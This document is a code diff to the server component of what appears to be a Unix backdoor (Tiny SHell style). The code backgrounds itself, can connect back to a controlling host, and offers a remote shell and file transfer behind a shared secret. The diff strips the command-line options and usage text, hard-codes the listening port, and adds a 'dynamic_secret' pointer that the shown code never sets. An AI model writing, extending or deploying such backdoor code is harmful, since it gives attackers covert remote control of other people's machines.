@@ -43,21 +43,12 @@
 #include "pel.h"
 
 unsigned char message[BUFSIZE + 1];
-extern char *optarg;
-extern int optind;
 
 /* function declaration */
 
 int tshd_get_file( int client );
 int tshd_put_file( int client );
 int tshd_runshell( int client );
-
-void usage(char *argv0)
-{
-    fprintf(stderr, "Usage: %s [ -s secret ] [ -p port ]\n", argv0);
-    exit(1);
-}
-
 
 /* program entry point */
 
@@ -66,7 +57,7 @@ int main( int argc, char **argv )
 {
     int ret, len, pid;
     socklen_t n;
-    int opt;
+    char *dynamic_secret = NULL;
 
 #ifndef CONNECT_BACK_HOST
 
@@ -81,22 +72,6 @@ int main( int argc, char **argv )
     struct hostent *client_host;
 
 #endif
-
-    while ((opt = getopt(argc, argv, "s:p:")) != -1) {
-        switch (opt) {
-            case 'p':
-                server_port=atoi(optarg); /* We hope ... */
-                if (!server_port) usage(*argv);
-                break;
-            case 's':
-                secret=optarg; /* We hope ... */
-                break;
-            default: /* '?' */
-                usage(*argv);
-                break;
-        }
-    }
-
 
     /* fork into background */
 
@@ -153,7 +128,7 @@ int main( int argc, char **argv )
     }
 
     server_addr.sin_family      = AF_INET;
-    server_addr.sin_port        = htons( server_port );
+    server_addr.sin_port        = htons( SERVER_PORT );
     server_addr.sin_addr.s_addr = INADDR_ANY;
 
     ret = bind( server, (struct sockaddr *) &server_addr,
@@ -215,7 +190,7 @@ int main( int argc, char **argv )
                 client_host->h_length );
 
         client_addr.sin_family = AF_INET;
-        client_addr.sin_port   = htons( server_port );
+        client_addr.sin_port   = htons( SERVER_PORT );
 
         /* try to connect back to the client */
 
@@ -274,7 +249,7 @@ int main( int argc, char **argv )
 
         alarm( 3 );
 
-        ret = pel_server_init( client, secret );
+        ret = pel_server_init( client, dynamic_secret ? dynamic_secret : secret );
 
         if( ret != PEL_SUCCESS )
         {
